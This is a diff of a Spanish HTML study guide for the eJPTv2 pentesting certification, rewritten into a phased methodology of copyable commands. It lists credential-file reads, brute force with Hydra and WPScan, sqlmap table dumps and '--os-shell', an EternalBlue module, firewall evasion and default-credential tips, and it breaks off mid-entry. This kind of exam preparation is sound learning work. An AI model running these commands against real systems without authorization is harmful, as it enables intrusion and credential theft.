@@ -3,585 +3,697 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>eJPTv2 - Guía de Herramientas</title>
+  <title>eJPTv2 - Metodología de Pentesting</title>
   <style>
-.section {
-  background: #111827;
-  color: #f3f4f6;
-  padding: 2rem;
-  margin: 2rem 0;
-  border-radius: 1rem;
-  box-shadow: 0 0 20px rgba(0,0,0,0.4);
-}
-.section-title {
-  font-size: 1.8rem;
-  font-weight: 700;
-  color: #facc15;
-  margin-bottom: 0.5rem;
-}
-.section-desc {
-  color: #9ca3af;
-  margin-bottom: 1.5rem;
-}
-.accordion {
-  margin-bottom: 1rem;
-  border: 1px solid #1f2937;
-  border-radius: 0.75rem;
-  overflow: hidden;
-}
-.accordion-btn {
-  width: 100%;
-  text-align: left;
-  padding: 1rem;
-  background: #1f2937;
-  color: #f9fafb;
-  font-weight: 600;
-  border: none;
-  cursor: pointer;
-  transition: background 0.2s;
-}
-.accordion-btn:hover {
-  background: #374151;
-}
-.accordion-content {
-  display: none;
-  background: #111827;
-  padding: 1rem 1.5rem;
-  font-size: 0.95rem;
-  color: #d1d5db;
-}
-.accordion-content ul {
-  list-style-type: disc;
-  margin-left: 1.5rem;
-}
-.accordion-content code {
-  background: #374151;
-  padding: 0.15rem 0.35rem;
-  border-radius: 0.25rem;
-  font-size: 0.9rem;
-  color: #facc15;
-}
-.accordion.active .accordion-content {
-  display: block;
-}
     :root{
       --bg:#0f1720;
       --card:#0b1220;
+      --surface:#1a1f2e;
       --muted:#94a3b8;
       --accent-yellow:#f59e0b;
       --accent-blue:#60a5fa;
-      --accent-purple:#8b5cf6;
+      --accent-green:#10b981;
+      --accent-red:#ef4444;
       --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace;
     }
-    html,body{height:100%}
+    * { box-sizing: border-box; }
+    html,body{height:100%;margin:0;padding:0}
     body{
-      margin:0;
       font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
       background: linear-gradient(180deg,#071023 0%, #0b1020 100%);
       color:#e6eef8;
       -webkit-font-smoothing:antialiased;
       -moz-osx-font-smoothing:grayscale;
-      padding:24px;
     }
-    .container{max-width:1100px;margin:0 auto}
-    .header{text-align:center;margin-bottom:28px}
+    .container{max-width:1200px;margin:0 auto;padding:24px}
+
+    /* Header */
+    .header{text-align:center;margin-bottom:40px;padding:40px 0}
     .title{
       font-weight:800;
-      font-size:32px;
-      background: linear-gradient(90deg,var(--accent-blue),var(--accent-purple));
+      font-size:clamp(28px, 5vw, 42px);
+      background: linear-gradient(90deg,var(--accent-blue),var(--accent-green));
       -webkit-background-clip:text;background-clip:text;color:transparent;
-      margin:0;
+      margin:0 0 10px 0;
     }
-    .subtitle{color:var(--muted);margin-top:6px}
+    .subtitle{color:var(--muted);font-size:clamp(14px, 2vw, 18px)}
 
-    .howto{background:linear-gradient(90deg,#06202f 0%, #0d0730 100%);padding:18px;border-radius:14px;box-shadow:0 10px 30px rgba(2,6,23,.6);margin-bottom:20px}
-    .how-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px}
-    .how-item{background:var(--card);padding:12px;border-radius:10px}
-    .how-item .lead{font-weight:700;color:var(--accent-blue);margin-bottom:6px}
-    .how-item .muted{color:var(--muted);font-size:13px}
+    /* Roadmap visual */
+    .roadmap{
+      display:flex;
+      flex-direction:column;
+      gap:20px;
+      position:relative;
+      padding-left:40px;
+      margin:40px 0;
+    }
+    .roadmap::before{
+      content:'';
+      position:absolute;
+      left:18px;
+      top:30px;
+      bottom:30px;
+      width:3px;
+      background:linear-gradient(180deg, var(--accent-blue), var(--accent-green), var(--accent-yellow), var(--accent-red));
+      border-radius:2px;
+    }
 
-    section.category{margin-bottom:22px}
-    section.category h2{display:flex;align-items:center;gap:10px;font-size:20px;color:#c4b5fd;margin-bottom:10px}
+    /* Phase card */
+    .phase{
+      background:var(--surface);
+      border-radius:12px;
+      padding:24px;
+      position:relative;
+      box-shadow:0 4px 20px rgba(0,0,0,0.4);
+      transition:transform 0.2s, box-shadow 0.2s;
+    }
+    .phase:hover{
+      transform:translateX(4px);
+      box-shadow:0 6px 30px rgba(0,0,0,0.6);
+    }
+    .phase::before{
+      content:'';
+      position:absolute;
+      left:-40px;
+      top:24px;
+      width:20px;
+      height:20px;
+      background:var(--accent-blue);
+      border-radius:50%;
+      border:4px solid #071023;
+    }
+    .phase.active::before{background:var(--accent-green)}
 
-    .tool-card{margin-bottom:12px}
-    .tool-btn{
-      width:100%;
+    .phase-header{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      margin-bottom:16px;
+      cursor:pointer;
+      user-select:none;
+    }
+    .phase-number{
+      background:var(--accent-blue);
+      color:#000;
+      width:36px;
+      height:36px;
+      border-radius:8px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-weight:700;
+      font-size:18px;
+      flex-shrink:0;
+    }
+    .phase-title{
+      font-size:22px;
+      font-weight:700;
+      color:#fff;
+      flex:1;
+    }
+    .phase-toggle{
+      color:var(--muted);
+      transition:transform 0.2s;
+      flex-shrink:0;
+    }
+    .phase.open .phase-toggle{transform:rotate(180deg)}
+    .phase-desc{
+      color:var(--muted);
+      margin-bottom:16px;
+      font-size:14px;
+      line-height:1.6;
+    }
+
+    /* Tools grid */
+    .tools-grid{
+      display:none;
+      grid-template-columns:repeat(auto-fill, minmax(280px, 1fr));
+      gap:12px;
+      margin-top:16px;
+    }
+    .phase.open .tools-grid{display:grid}
+
+    .tool-card{
+      background:#0d1117;
+      border:1px solid rgba(255,255,255,0.08);
+      border-radius:10px;
+      padding:16px;
+      transition:all 0.2s;
+      cursor:pointer;
+    }
+    .tool-card:hover{
+      border-color:var(--accent-blue);
+      transform:translateY(-2px);
+      box-shadow:0 4px 16px rgba(96, 165, 250, 0.2);
+    }
+    .tool-header{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      margin-bottom:12px;
+    }
+    .tool-icon{
+      width:32px;
+      height:32px;
+      background:rgba(96, 165, 250, 0.15);
+      border-radius:6px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      flex-shrink:0;
+    }
+    .tool-icon svg{width:18px;height:18px;color:var(--accent-blue)}
+    .tool-name{
+      font-weight:700;
+      color:#fff;
+      font-size:16px;
+    }
+
+    /* Commands */
+    .commands{
+      display:none;
+      margin-top:16px;
+      gap:10px;
+      flex-direction:column;
+    }
+    .tool-card.expanded .commands{display:flex}
+
+    .cmd-block{
+      background:#06101a;
+      border:1px solid rgba(255,255,255,0.05);
+      border-radius:8px;
+      overflow:hidden;
+    }
+    .cmd-header{
+      padding:10px 12px;
+      background:#0a1420;
       display:flex;
       align-items:center;
       justify-content:space-between;
-      gap:12px;
-      padding:12px;
-      border-radius:10px;
-      border:0;
+      border-bottom:1px solid rgba(255,255,255,0.05);
+    }
+    .cmd-label{
+      color:var(--accent-yellow);
+      font-size:13px;
+      font-weight:600;
+    }
+    .copy-btn{
+      background:rgba(96, 165, 250, 0.15);
+      border:1px solid rgba(96, 165, 250, 0.3);
+      color:var(--accent-blue);
+      padding:4px 10px;
+      border-radius:4px;
+      font-size:12px;
       cursor:pointer;
-      color:white;
-      box-shadow:0 6px 18px rgba(2,6,23,.6);
-      transition:transform .15s ease,opacity .12s;
+      transition:all 0.2s;
+      font-family:var(--mono);
     }
-    .tool-btn:active{transform:translateY(1px)}
-    .tool-left{display:flex;align-items:center;gap:12px}
-    .tool-meta{line-height:1}
-    .tool-title{font-weight:700}
-    .tool-category{font-size:12px;color:rgba(255,255,255,.75)}
+    .copy-btn:hover{
+      background:rgba(96, 165, 250, 0.25);
+      border-color:var(--accent-blue);
+    }
+    .copy-btn.copied{
+      background:rgba(16, 185, 129, 0.25);
+      border-color:var(--accent-green);
+      color:var(--accent-green);
+    }
+    .cmd-code{
+      padding:12px;
+      font-family:var(--mono);
+      font-size:13px;
+      color:#7ee787;
+      overflow-x:auto;
+      line-height:1.6;
+    }
+    .cmd-code .comment{color:#94a3b8}
+    .cmd-expl{
+      padding:10px 12px;
+      background:#0a1420;
+      border-top:1px solid rgba(255,255,255,0.05);
+      color:var(--muted);
+      font-size:12px;
+      display:flex;
+      gap:8px;
+      align-items:flex-start;
+    }
 
-    /* tool color variants */
-    .c-blue{background:#2563eb}
-    .c-green{background:#16a34a}
-    .c-red{background:#dc2626}
-    .c-purple{background:#7c3aed}
-    .c-orange{background:#f97316}
-    .c-indigo{background:#4338ca}
-    .c-yellow{background:#f59e0b}
-    .c-gray{background:#374151}
-    .c-reddark{background:#b91c1c}
-    .c-pink{background:#db2777}
-
-    .chev{transition:transform .18s ease;opacity:.95}
-    .chev.rot{transform:rotate(90deg)}
-
-    .examples{
-      margin-top:10px;
-      animation:fadeIn .22s ease;
+    /* Tips */
+    .tips-section{
+      background:linear-gradient(135deg, #064e3b 0%, #1e3a8a 100%);
+      padding:24px;
+      border-radius:12px;
+      margin:40px 0;
+    }
+    .tips-title{
+      font-size:20px;
+      font-weight:700;
+      color:#fff;
+      margin:0 0 16px 0;
+      display:flex;
+      align-items:center;
+      gap:8px;
+    }
+    .tips-grid{
       display:grid;
-      gap:10px;
+      grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));
+      gap:12px;
     }
-    .example{
-      background:#0b1218;padding:12px;border-radius:10px;border-left:4px solid var(--accent-yellow);
+    .tip{
+      background:rgba(0,0,0,0.3);
+      padding:12px;
+      border-radius:8px;
+      font-size:13px;
+      line-height:1.5;
+      border-left:3px solid var(--accent-yellow);
     }
-    .ex-head{display:flex;gap:10px;align-items:flex-start;margin-bottom:8px}
-    .ex-num{background:var(--accent-yellow);color:#071020;padding:4px 8px;border-radius:6px;font-weight:700;font-size:12px}
-    .ex-title{color:#fbbf24;font-weight:700}
 
-    .cmd{
-      background:#06101a;padding:10px;border-radius:8px;font-family:var(--mono);font-size:13px;color:#7ee787;overflow:auto;margin-bottom:8px;border:1px solid rgba(255,255,255,.03)
+    footer{
+      text-align:center;
+      padding:32px;
+      color:var(--muted);
+      font-size:13px;
     }
-    .cmd .comment{color:#94a3b8}
-    .cmd .prompt{color:#60a5fa;margin-right:6px}
-    .ex-expl{color:var(--muted);font-size:13px;display:flex;gap:8px;align-items:flex-start}
 
-    .pro-tips{margin-top:18px;background:linear-gradient(90deg,#063b2b,#06365a);padding:12px;border-radius:10px}
-    .pro-tips h3{display:flex;gap:8px;align-items:center;margin:0 0 10px 0;color:#f59e0b}
-    .tips-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px}
-    .tip{background:#0b1316;padding:10px;border-radius:8px;color:var(--muted);font-size:13px}
-
-    footer{margin-top:24px;color:var(--muted);font-size:13px;text-align:center}
-
-    @keyframes fadeIn {from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}
-    /* responsive */
-    @media (max-width:520px){
-      .title{font-size:24px}
+    /* Responsive */
+    @media (max-width:768px){
+      .roadmap{padding-left:30px}
+      .roadmap::before{left:13px}
+      .phase::before{left:-30px;width:16px;height:16px}
+      .tools-grid{grid-template-columns:1fr}
     }
   </style>
 </head>
 <body>
   <div class="container">
     <header class="header">
-      <h1 class="title">eJPTv2 - Guía de Herramientas con Ejemplos</h1>
-      <p class="subtitle">Casos de uso reales para cada herramienta — archivo HTML independiente</p>
+      <h1 class="title">eJPTv2 - Metodología de Pentesting</h1>
+      <p class="subtitle">Guía completa paso a paso con comandos copiables</p>
     </header>
 
-    <div class="howto" aria-hidden="false">
-      <h2 style="color:white;margin:0 0 8px 0;display:flex;align-items:center;gap:8px"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="opacity:.95"><path d="M10 3h4v2h-4zM3 8h18v2H3zM7 13h10v2H7zM11 18h2v2h-2z" fill="currentColor"/></svg> Cómo usar esta guía</h2>
-      <div class="how-grid">
-        <div class="how-item">
-          <div class="lead">1️⃣ Selecciona Herramienta</div>
-          <div class="muted">Toca la tarjeta para abrir/cerrar</div>
-        </div>
-        <div class="how-item">
-          <div class="lead">2️⃣ Ver Ejemplos</div>
-          <div class="muted">Cada ejemplo muestra comando y explicación</div>
-        </div>
-        <div class="how-item">
-          <div class="lead">3️⃣ Aplicar</div>
-          <div class="muted">Copia y adapta en tu entorno legal</div>
-        </div>
-      </div>
-    </div>
-
-    <main id="main"></main>
-
-    <div class="pro-tips">
-      <h3>🛡️ Tips Pro para el examen</h3>
+    <div class="tips-section">
+      <h3 class="tips-title">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+        Cómo usar esta guía
+      </h3>
       <div class="tips-grid">
-        <div class="tip">✅ Combina herramientas: Nmap → Searchsploit → Metasploit</div>
-        <div class="tip">✅ Guarda todos los outputs: -o output.txt</div>
-        <div class="tip">✅ Prueba credenciales default: admin:admin, root:root</div>
-        <div class="tip">✅ Reutiliza passwords encontradas en todos los servicios</div>
+        <div class="tip">1. Sigue las fases en orden secuencial</div>
+        <div class="tip">2. Haz clic en cada herramienta para ver comandos</div>
+        <div class="tip">3. Usa el botón COPIAR en cada comando</div>
+        <div class="tip">4. Guarda todos los outputs en archivos</div>
+        <div class="tip">5. Reutiliza información entre fases</div>
       </div>
-    </div> 
-!-- 🧠 SECCIÓN: RECONOCIMIENTO PASIVO -->
-<section class="section">
-  <h2 class="section-title">🧠 Reconocimiento Pasivo</h2>
-  <p class="section-desc">
-    Fase enfocada en recolectar información sin interactuar activamente con los servicios del objetivo. 
-    Aquí tienes una lista de comprobaciones y comandos útiles.
-  </p>
-
-  <!-- BLOQUE 1 -->
-  <div class="accordion">
-    <button class="accordion-btn">📁 Revisión de archivos y permisos</button>
-    <div class="accordion-content">
-      <ul>
-        <li><b>Ver archivos con bit SUID:</b> <code>find / -perm -4000 2>/dev/null</code> → Binarios que pueden usarse para escalar privilegios</li>
-        <li><b>Ver archivos con bit SGID:</b> <code>find / -perm -2000 2>/dev/null</code> → Permiten ejecutar con grupo del propietario</li>
-        <li><b>Usuarios del sistema:</b> <code>cat /etc/passwd</code> → Lista usuarios válidos</li>
-        <li><b>Buscar contraseñas en texto plano:</b> <code>grep -ri password /etc/* 2>/dev/null</code></li>
-      </ul>
     </div>
-  </div>
 
-  <!-- BLOQUE 2 -->
-  <div class="accordion">
-    <button class="accordion-btn">🌐 Información del sistema y red</button>
-    <div class="accordion-content">
-      <ul>
-        <li><b>Versión del sistema:</b> <code>uname -a</code> → Kernel y arquitectura</li>
-        <li><b>Distribución:</b> <code>cat /etc/os-release</code></li>
-        <li><b>Interfaces de red:</b> <code>ip a</code></li>
-        <li><b>DNS configurado:</b> <code>cat /etc/resolv.conf</code></li>
-        <li><b>Procesos activos:</b> <code>ps aux</code></li>
-        <li><b>Usuarios conectados:</b> <code>who</code> o <code>w</code></li>
-      </ul>
-    </div>
-  </div>
+    <div class="roadmap" id="roadmap"></div>
 
-  <!-- BLOQUE 3 -->
-  <div class="accordion">
-    <button class="accordion-btn">🔍 Enumeración pasiva del sistema</button>
-    <div class="accordion-content">
-      <ul>
-        <li><b>Variables de entorno:</b> <code>env</code> → Puede revelar claves o rutas</li>
-        <li><b>Cron jobs:</b> <code>cat /etc/crontab</code></li>
-        <li><b>Llaves SSH:</b> <code>ls -la ~/.ssh/</code></li>
-        <li><b>Historial bash:</b> <code>cat ~/.bash_history</code></li>
-        <li><b>Configuración sudo:</b> <code>sudo -l</code></li>
-      </ul>
+    <div class="tips-section">
+      <h3 class="tips-title">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        Tips Pro para el Examen
+      </h3>
+      <div class="tips-grid">
+        <div class="tip">Combina herramientas: Nmap → Searchsploit → Metasploit</div>
+        <div class="tip">Prueba credenciales default: admin:admin, root:root</div>
+        <div class="tip">Reutiliza passwords encontradas en todos los servicios</div>
+        <div class="tip">Documenta cada descubrimiento inmediatamente</div>
+        <div class="tip">Si encuentras un puerto, enumera el servicio completamente</div>
+        <div class="tip">Usa -oN output.txt para guardar resultados</div>
+      </div>
     </div>
-  </div>
 
-  <!-- BLOQUE 4 -->
-  <div class="accordion">
-    <button class="accordion-btn">🌍 Fuentes externas (reconocimiento real pasivo)</button>
-    <div class="accordion-content">
-      <ul>
-        <li><b>WHOIS:</b> <code>whois dominio.com</code> → Información del dominio</li>
-        <li><b>DNS:</b> <code>dig dominio.com any</code></li>
-        <li><b>Subdominios:</b> <code>crt.sh</code>, <code>dnsdumpster.com</code></li>
-        <li><b>Búsqueda en Google:</b> <code>site:dominio.com intitle:"index of"</code></li>
-        <li><b>Repositorios y redes:</b> LinkedIn, GitHub, Shodan</li>
-        <li><b>Wayback Machine:</b> <code>web.archive.org</code></li>
-      </ul>
-    </div>
-  </div>
-
-  <!-- BLOQUE 5 -->
-  <div class="accordion">
-    <button class="accordion-btn">💡 Consejos rápidos</button>
-    <div class="accordion-content">
-      <ul>
-        <li>Evita herramientas activas (como Nmap o Nikto) en esta fase.</li>
-        <li>Solo usa información de archivos locales o fuentes públicas.</li>
-        <li>Guarda todos los hallazgos en un archivo <code>notes.txt</code>.</li>
-        <li>Prioriza usuarios, rutas, versiones y permisos.</li>
-      </ul>
-    </div>
-  </div>
-</section>
- 
-  
-</section>
     <footer>
-      Archivo HTML autónomo — usa el contenido solo en entornos autorizados.
+      Archivo HTML autónomo - Usa el contenido solo en entornos autorizados
     </footer>
   </div>
 
   <script>
-document.querySelectorAll('.accordion-btn').forEach(btn => {
-  btn.addEventListener('click', () => {
-    const item = btn.parentElement;
-    item.classList.toggle('active');
-  });
-});
-    // ======= datos (convertidos de tu objeto React) ========
-    const tools = {
-      nmap: {
-        title: "Nmap - Escaneo de Red",
-        colorClass: "c-blue",
-        category: "Reconocimiento",
-        examples: [
-          { scenario: "Descubrir hosts activos", command: "nmap -sn 192.168.1.0/24", explanation: "Hace ping sweep sin escaneo de puertos" },
-          { scenario: "Escaneo básico de puertos", command: "nmap -sV -sC -p- 192.168.1.100", explanation: "-sV: versiones | -sC: scripts default | -p-: todos los puertos" },
-          { scenario: "Escaneo rápido top 1000", command: "nmap -T4 -F 192.168.1.100", explanation: "-T4: velocidad agresiva | -F: fast scan" },
-          { scenario: "Escaneo UDP común", command: "nmap -sU --top-ports 100 192.168.1.100", explanation: "Escanea los 100 puertos UDP más comunes" },
-          { scenario: "Detectar SO y traceroute", command: "nmap -A 192.168.1.100", explanation: "Detección agresiva: SO, versión, scripts, traceroute" },
-          { scenario: "Buscar vulnerabilidades", command: "nmap --script vuln 192.168.1.100", explanation: "Ejecuta scripts de detección de vulnerabilidades" }
+    const methodology = [
+      {
+        phase: "Reconocimiento Pasivo",
+        description: "Recolectar información sin interactuar directamente con el objetivo. OSINT y fuentes públicas.",
+        tools: [
+          {
+            name: "WHOIS & DNS",
+            commands: [
+              { label: "Consulta WHOIS", cmd: "whois dominio.com", desc: "Obtiene información del dominio: registrador, fechas, contactos" },
+              { label: "DNS básico", cmd: "dig dominio.com any", desc: "Enumera todos los registros DNS disponibles" },
+              { label: "DNS inverso", cmd: "dig -x 192.168.1.100", desc: "Resuelve IP a nombre de dominio" },
+              { label: "Subdominios (DNSenum)", cmd: "dnsenum dominio.com", desc: "Busca subdominios automáticamente" }
+            ]
+          },
+          {
+            name: "Búsqueda Web",
+            commands: [
+              { label: "Google Dorks", cmd: "site:dominio.com filetype:pdf", desc: "Busca archivos PDF en el dominio objetivo" },
+              { label: "Directorios expuestos", cmd: 'site:dominio.com intitle:"index of"', desc: "Encuentra directorios sin protección" },
+              { label: "Archivos de configuración", cmd: "site:dominio.com ext:conf OR ext:config", desc: "Busca archivos de configuración expuestos" }
+            ]
+          },
+          {
+            name: "OSINT Tools",
+            commands: [
+              { label: "TheHarvester", cmd: "theHarvester -d dominio.com -b google,bing,linkedin", desc: "Recolecta emails, subdominios y nombres de fuentes públicas" },
+              { label: "Certificados SSL", cmd: "curl https://crt.sh/?q=%.dominio.com", desc: "Busca subdominios vía certificados SSL públicos" },
+              { label: "Wayback Machine", cmd: "curl http://web.archive.org/cdx/search/cdx?url=dominio.com/*&output=text", desc: "Obtiene historial de URLs archivadas" }
+            ]
+          }
         ]
       },
-      gobuster: {
-        title: "Gobuster - Directory Bruteforce",
-        colorClass: "c-green",
-        category: "Web",
-        examples: [
-          { scenario: "Buscar directorios comunes", command: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt", explanation: "Busca directorios con wordlist común" },
-          { scenario: "Buscar archivos específicos", command: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt", explanation: "-x: extensiones a buscar" },
-          { scenario: "Con autenticación básica", command: "gobuster dir -u http://10.10.10.100 -w wordlist.txt -U admin -P password123", explanation: "-U: usuario | -P: password" },
-          { scenario: "Buscar subdominios", command: "gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt", explanation: "Modo DNS para encontrar subdominios" },
-          { scenario: "Ignorar certificados SSL", command: "gobuster dir -u https://10.10.10.100 -w wordlist.txt -k", explanation: "-k: ignora errores de certificado SSL" }
+      {
+        phase: "Reconocimiento Activo",
+        description: "Escanear la red objetivo para descubrir hosts activos, puertos abiertos y servicios.",
+        tools: [
+          {
+            name: "Nmap - Descubrimiento",
+            commands: [
+              { label: "Ping Sweep", cmd: "nmap -sn 192.168.1.0/24", desc: "Descubre hosts activos sin escanear puertos" },
+              { label: "Escaneo rápido", cmd: "nmap -T4 -F 192.168.1.100", desc: "Escanea los 100 puertos más comunes rápidamente" },
+              { label: "Escaneo completo", cmd: "nmap -sV -sC -p- 192.168.1.100 -oN scan.txt", desc: "Escanea todos los puertos con detección de versiones y scripts" },
+              { label: "UDP común", cmd: "nmap -sU --top-ports 100 192.168.1.100", desc: "Escanea los 100 puertos UDP más comunes" }
+            ]
+          },
+          {
+            name: "Nmap - Detección Avanzada",
+            commands: [
+              { label: "Detección de SO", cmd: "nmap -A 192.168.1.100", desc: "Detección agresiva: SO, versión, scripts, traceroute" },
+              { label: "Scripts vulnerabilidades", cmd: "nmap --script vuln 192.168.1.100", desc: "Ejecuta scripts de detección de vulnerabilidades conocidas" },
+              { label: "Script SMB", cmd: "nmap --script smb-enum-shares,smb-enum-users 192.168.1.100", desc: "Enumera shares y usuarios SMB" },
+              { label: "Evasión de firewall", cmd: "nmap -sS -T2 -f 192.168.1.100", desc: "SYN scan lento con fragmentación de paquetes" }
+            ]
+          }
         ]
       },
-      hydra: {
-        title: "Hydra - Brute Force",
-        colorClass: "c-red",
-        category: "Password Attack",
-        examples: [
-          { scenario: "Ataque SSH", command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100", explanation: "-l: usuario fijo | -P: wordlist de passwords" },
-          { scenario: "FTP con lista de usuarios", command: "hydra -L users.txt -P passwords.txt ftp://192.168.1.100", explanation: "-L: lista de usuarios | -P: lista de passwords" },
-          { scenario: "HTTP POST form", command: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/login.php:username=^USER^&password=^PASS^:F=incorrect'", explanation: "F=incorrect: mensaje de error cuando falla" },
-          { scenario: "HTTP GET form", command: "hydra -L users.txt -P pass.txt 192.168.1.100 http-get-form '/login:user=^USER^&pass=^PASS^:S=Welcome'", explanation: "S=Welcome: mensaje de éxito" },
-          { scenario: "MySQL database", command: "hydra -l root -P passwords.txt mysql://192.168.1.100", explanation: "Ataque a base de datos MySQL" },
-          { scenario: "SMB/Windows shares", command: "hydra -l administrator -P rockyou.txt smb://192.168.1.100", explanation: "Fuerza bruta contra shares SMB" }
+      {
+        phase: "Enumeración Web",
+        description: "Descubrir directorios ocultos, archivos y vulnerabilidades en aplicaciones web.",
+        tools: [
+          {
+            name: "Gobuster",
+            commands: [
+              { label: "Directorios comunes", cmd: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt", desc: "Busca directorios con wordlist común" },
+              { label: "Archivos específicos", cmd: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak", desc: "Busca archivos con extensiones específicas" },
+              { label: "Subdominios", cmd: "gobuster dns -d dominio.com -w /usr/share/wordlists/subdomains-top1million-5000.txt", desc: "Enumera subdominios" },
+              { label: "Con autenticación", cmd: "gobuster dir -u http://10.10.10.100 -w wordlist.txt -U admin -P password123", desc: "Bruteforce con autenticación básica" }
+            ]
+          },
+          {
+            name: "Nikto",
+            commands: [
+              { label: "Escaneo básico", cmd: "nikto -h http://192.168.1.100", desc: "Escanea vulnerabilidades web comunes" },
+              { label: "Puerto específico", cmd: "nikto -h 192.168.1.100 -p 8080", desc: "Escanea servidor web en puerto personalizado" },
+              { label: "Con SSL", cmd: "nikto -h https://192.168.1.100 -ssl", desc: "Escaneo de sitio HTTPS" },
+              { label: "Guardar reporte", cmd: "nikto -h http://192.168.1.100 -o results.html -Format html", desc: "Exporta resultados en HTML" }
+            ]
+          },
+          {
+            name: "Scraping de Imágenes",
+            commands: [
+              { label: "wget recursivo", cmd: "wget -r -l 2 -A jpg,jpeg,png,gif http://dominio.com/images/", desc: "Descarga todas las imágenes recursivamente hasta nivel 2" },
+              { label: "wget solo imágenes", cmd: "wget -nd -H -p -A jpg,jpeg,png,gif -e robots=off http://dominio.com", desc: "Descarga solo imágenes ignorando robots.txt" },
+              { label: "cURL con grep", cmd: "curl -s http://dominio.com | grep -oP 'src=\"\\K[^\"]*\\.(jpg|png|gif)' | xargs -I {} wget http://dominio.com/{}", desc: "Extrae y descarga URLs de imágenes del HTML" },
+              { label: "exiftool metadata", cmd: "exiftool *.jpg", desc: "Extrae metadata de todas las imágenes (puede revelar info sensible)" }
+            ]
+          },
+          {
+            name: "WPScan",
+            commands: [
+              { label: "Escaneo básico", cmd: "wpscan --url http://dominio.com", desc: "Enumera versión de WordPress, plugins y temas" },
+              { label: "Enumerar usuarios", cmd: "wpscan --url http://dominio.com --enumerate u", desc: "Lista usuarios de WordPress" },
+              { label: "Plugins vulnerables", cmd: "wpscan --url http://dominio.com --enumerate vp", desc: "Busca plugins con vulnerabilidades conocidas" },
+              { label: "Fuerza bruta WP", cmd: "wpscan --url http://dominio.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin,administrator", desc: "Ataque de fuerza bruta al panel wp-login.php" },
+              { label: "API Token", cmd: "wpscan --url http://dominio.com --api-token TU_TOKEN_AQUI", desc: "Usa API de WPVulnDB para mejor detección de vulnerabilidades" }
+            ]
+          }
         ]
       },
-      sqlmap: {
-        title: "SQLMap - SQL Injection",
-        colorClass: "c-purple",
-        category: "Web",
-        examples: [
-          { scenario: "Detectar SQL injection", command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --batch", explanation: "--batch: modo automático sin preguntas" },
-          { scenario: "Listar bases de datos", command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --dbs", explanation: "--dbs: enumera todas las bases de datos" },
-          { scenario: "Listar tablas de una BD", command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database_name --tables", explanation: "-D: selecciona BD | --tables: lista tablas" },
-          { scenario: "Dumpear tabla específica", command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database -T users --dump", explanation: "-T: tabla | --dump: extrae datos" },
-          { scenario: "Con método POST", command: "sqlmap -u 'http://10.10.10.100/login.php' --data='username=admin&password=test' -p username", explanation: "--data: datos POST | -p: parámetro vulnerable" },
-          { scenario: "Obtener shell del servidor", command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --os-shell", explanation: "Intenta obtener una shell interactiva" }
+      {
+        phase: "Enumeración de Servicios",
+        description: "Enumerar servicios específicos encontrados: SMB, FTP, SSH, bases de datos, etc.",
+        tools: [
+          {
+            name: "SMB / Samba",
+            commands: [
+              { label: "Listar shares", cmd: "smbclient -L //192.168.1.100 -N", desc: "Lista shares disponibles sin autenticación" },
+              { label: "Conectar a share", cmd: "smbclient //192.168.1.100/share_name -U username", desc: "Conecta a un share específico" },
+              { label: "Enum4linux completo", cmd: "enum4linux -a 192.168.1.100", desc: "Enumera usuarios, shares, grupos, políticas" },
+              { label: "SMBMap permisos", cmd: "smbmap -H 192.168.1.100 -u guest", desc: "Muestra permisos de acceso a cada share" }
+            ]
+          },
+          {
+            name: "FTP",
+            commands: [
+              { label: "Login anónimo", cmd: "ftp 192.168.1.100\n# Usuario: anonymous\n# Password: (vacío)", desc: "Intenta acceso anónimo a FTP" },
+              { label: "Nmap FTP anon", cmd: "nmap --script ftp-anon 192.168.1.100", desc: "Verifica si FTP permite acceso anónimo" },
+              { label: "Download recursivo", cmd: "wget -r ftp://anonymous:@192.168.1.100/", desc: "Descarga todo el contenido FTP recursivamente" }
+            ]
+          },
+          {
+            name: "MySQL / PostgreSQL",
+            commands: [
+              { label: "Conectar MySQL", cmd: "mysql -h 192.168.1.100 -u root -p", desc: "Conexión interactiva a MySQL" },
+              { label: "Nmap MySQL", cmd: "nmap --script mysql-enum 192.168.1.100", desc: "Enumera información de la base de datos MySQL" },
+              { label: "PostgreSQL", cmd: "psql -h 192.168.1.100 -U postgres", desc: "Conexión a PostgreSQL" }
+            ]
+          }
         ]
       },
-      metasploit: {
-        title: "Metasploit - Exploitation Framework",
-        colorClass: "c-orange",
-        category: "Explotación",
-        examples: [
-          { scenario: "Iniciar Metasploit", command: "msfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue", explanation: "Buscar y seleccionar exploit" },
